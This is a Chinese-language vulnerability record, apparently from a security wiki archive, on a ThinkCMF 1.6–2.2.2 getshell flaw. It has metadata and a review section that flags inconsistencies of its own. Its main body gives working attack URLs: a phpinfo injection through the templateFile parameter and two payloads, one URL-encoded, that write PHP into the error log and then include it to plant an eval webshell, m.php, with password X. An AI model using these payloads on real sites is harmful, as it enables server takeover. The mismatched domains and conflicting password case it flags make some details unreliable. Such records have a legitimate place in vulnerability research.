---
source: "白阁文库 BaizeSec/bylibrary"
product: "ThinkCMF X1.6.0/2.1.0/2.2.0–2.2.2"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ThinkCMF缓存Getshell漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：公共display、错误日志/模板编译开启及路径可知"
side_effects: "未执行；本文需注意的操作影响：两个漏洞详情空标题与资源差异可择优清理"
source_status: "unknown"
id: "vw-8b47a4302f2ae924c25f8a5e"
entity_id: "ve-1209bcce6ae6624f98e3532e"
schema_version: "1"
canonical: "Web安全/CMS内容/ThinkCMF/ThinkCMF 缓存Getshell.md"
relation_type: "duplicate_of"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：公共display、错误日志/模板编译开启及路径可知

- **结论使用边界（1）**：与419同文；请求wiki.bylibrary.cn却说在0-sec.org生成，镜像域替换不一致。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（2）**：同payload2大写X/文字x口令冲突，版本间空白仅格式。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（3）**：两个漏洞详情空标题与资源差异可择优清理。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ThinkCMF缓存Getshell漏洞

### 漏洞详情 ###


### 影响版本 ###

ThinkCMF X1.6.0

ThinkCMF X2.1.0

ThinkCMF X2.2.0 

ThinkCMF X2.2.1 

ThinkCMF X2.2.2

### 漏洞详情 ###

**常规操作**

    http://wiki.bylibrary.cn/index.php?a=display&templateFile=README.md&content=%3C?php%20phpinfo();die();

![](./.resource/ThinkCMF缓存Getshell漏洞/media/rId25.png)

**利用缓存文件getshell**

由于thinkcmf2.x使用了thinkphp3.x作为开发框架，默认情况下启用了报错日志并且开启了模板缓存，导致可以使用加载一个不存在的模板来将生成一句话的PHP代码写入data/runtime/Logs/Portal目录下的日志文件中，再次包含该日志文件即可在网站根目录下生成一句话木马m.php

日志文件格式为YY_MM_DD.log，如当前日期为2019年12月12日，日志文件为19_12_12.log，完整路径为

    data/runtime/Logs/Portal/19_12_12.log


**payload 一**

首先访问

    http://wiki.bylibrary.cn/?a=display&templateFile=%3C?php%20file_put_contents(%27m.php%27,%27%3C%3fphp+eval($_POST[%22X%22])%3b%3F%3E%27);die();?%3E
然后请求


    http://wiki.bylibrary.cn/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.log

即可在http://www.0-sec.org/根目录生成m.php，密码是X

payload 二

首先访问


    http://wiki.bylibrary.cn/?a=display&templateFile=%3C%3F%70%68%70%20%65%76%61%6C%28%24%5F%50%4F%53%54%5BX%5D%29%3B%3F%3E
然后菜刀链接（密码也是x）

    http://wiki.bylibrary.cn/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.log


---

> 来源：白阁文库 BaizeSec/bylibrary
